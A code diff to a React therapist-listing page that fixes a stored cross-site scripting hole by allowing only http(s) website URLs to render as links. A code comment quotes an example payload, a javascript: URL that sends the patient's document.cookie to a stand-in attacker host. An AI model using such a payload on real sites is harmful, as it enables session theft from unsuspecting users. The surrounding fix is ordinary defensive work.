@@ -7,6 +7,7 @@ import useSiteCopy from "@/lib/useSiteCopy";
 import credentialLabel from "@/lib/credentialLabel";
 import EmailButton from "@/components/EmailButton";
 import { api, getSession } from "@/lib/api";
+import { safeExternalUrl } from "@/lib/safeUrl";
 import { RESULTS_POLL_INTERVAL_MS } from "@/lib/constants";
 import {
   P1_OPTIONS,
@@ -1055,24 +1056,49 @@ export default function PatientResults() {
                               span={2}
                             />
                           ) : null}
-                          {t.website && (
-                            <div className="col-span-2 text-xs">
-                              <span className="text-[10px] uppercase tracking-wider text-[#6D6A65]">
-                                Website
-                              </span>
-                              <div>
-                                <a
-                                  href={t.website}
-                                  target="_blank"
-                                  rel="noopener noreferrer"
-                                  className="text-[#2D4A3E] underline break-all hover:text-[#C87965]"
-                                  data-testid={`therapist-website-${i}`}
-                                >
-                                  {t.website.replace(/^https?:\/\//, "")}
-                                </a>
+                          {/* 2026-05-18 security fix: scrub the website
+                              URL before rendering it as an href. A
+                              therapist could set
+                              website:"javascript:fetch('https://attacker/' + document.cookie)"
+                              at signup; the patient clicks the link and
+                              runs the script in their own session. The
+                              safeExternalUrl helper rejects anything
+                              that isn't http(s):// -- the URL renders as
+                              plain text instead of a clickable link in
+                              that case so admin / patient can still see
+                              what the therapist tried to enter. */}
+                          {t.website && (() => {
+                            const safeHref = safeExternalUrl(t.website);
+                            const display = String(t.website).replace(/^https?:\/\//, "");
+                            return (
+                              <div className="col-span-2 text-xs">
+                                <span className="text-[10px] uppercase tracking-wider text-[#6D6A65]">
+                                  Website
+                                </span>
+                                <div>
+                                  {safeHref ? (
+                                    <a
+                                      href={safeHref}
+                                      target="_blank"
+                                      rel="noopener noreferrer"
+                                      className="text-[#2D4A3E] underline break-all hover:text-[#C87965]"
+                                      data-testid={`therapist-website-${i}`}
+                                    >
+                                      {display}
+                                    </a>
+                                  ) : (
+                                    <span
+                                      className="text-[#6D6A65] break-all italic"
+                                      title="This therapist's website URL didn't pass safety checks and isn't clickable."
+                                      data-testid={`therapist-website-${i}-blocked`}
+                                    >
+                                      {display}
+                                    </span>
+                                  )}
+                                </div>
                               </div>
-                            </div>
-                          )}
+                            );
+                          })()}
                           {(() => {
                             const plans = t.insurance_accepted || [];
                             if (plans.length === 0) {
